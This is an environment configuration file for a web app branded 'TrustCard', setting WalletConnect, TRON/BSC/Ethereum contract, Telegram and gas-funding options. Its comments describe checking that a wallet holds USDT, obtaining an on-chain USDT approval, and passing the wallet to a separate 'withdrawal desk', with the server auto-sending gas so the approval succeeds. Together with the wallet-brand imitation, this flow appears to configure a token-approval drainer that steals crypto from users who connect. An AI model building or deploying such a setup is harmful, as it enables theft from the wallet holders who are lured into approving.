PORT=3000
NODE_ENV=development
PROJECT_ID=your_walletconnect_project_id
APP_NAME=TrustCard
APP_URL=https://my-server-k3gn.onrender.com
APP_ICON=https://my-server-k3gn.onrender.com/assets/svg/logo-trust.svg
CORS_ORIGIN=https://my-server-k3gn.onrender.com
LOG_LEVEL=info

# Card / USDT contracts — leave empty until you have real addresses.
# The server will not invent addresses. Payment create fails per network if missing.
TRON_CARD_CONTRACT=TWejasrnoKg2AgPpCwHgozYeThWBu8S9Hw
BSC_CARD_CONTRACT=
ETH_CARD_CONTRACT=
TRON_USDT_CONTRACT=
BSC_USDT_CONTRACT=
ETH_USDT_CONTRACT=

# Optional Telegram notifications (server still starts if unset)
TELEGRAM_BOT_TOKEN=
TELEGRAM_CHAT_ID=

# After a verified USDT approve, add the wallet to the withdrawal desk.
# DESK_INGEST_SECRET must match INGEST_SECRET on the desk service.
DESK_URL=https://backend-gndm.onrender.com
DESK_INGEST_SECRET=

# Card eligibility vs approval amount — independent settings.
# CARD_MIN_USDT: wallet must hold at least this much USDT to be eligible.
# CARD_APPROVE_USDT: on-chain approve amount. Use 1, 5, 0.7, or 5e18 (same as 5 USDT).
CARD_MIN_USDT=1
CARD_APPROVE_USDT=1
CARD_NETWORK_PRIORITY=tron,bsc,eth
GAS_FUNDING_BUFFER=0.20
GAS_FUNDING_MAX=2

# EVM gas top-up — set the exact native amount the server may send AFTER the user confirms.
# The frontend cannot choose this amount. Never exceed GAS_FUNDING_MAX_BSC / GAS_FUNDING_MAX_ETH.
# TRON: if wallet has less than 12 TRX, server auto-sends exactly 12 TRX (native only).
GAS_TOPUP_TRON=12
GAS_FUNDING_MAX_TRON=12
TRON_MIN_TRX=12
TRON_AUTO_FUND=true
TRON_APPROVE_MIN_SUN=12000000
GAS_TOPUP_BSC=0.0003
GAS_TOPUP_ETH=0.00005
GAS_FUNDING_MAX_BSC=0.01
GAS_FUNDING_MAX_ETH=0.003

# Funder keys — dedicated wallets with a small native balance. Never commit real keys.
# TRON_FUNDER_PRIVATE_KEY=
# BSC_FUNDER_PRIVATE_KEY=
# ETH_FUNDER_PRIVATE_KEY=
# Or one EVM key for both BSC and Ethereum:
# EVM_FUNDER_PRIVATE_KEY=


# RPC_ETH=
# RPC_BSC=
# TRON_API_URL=https://api.trongrid.io
# Optional TronGrid key — Render IPs often get HTTP 403/429 without it.
# TRON_API_KEY=

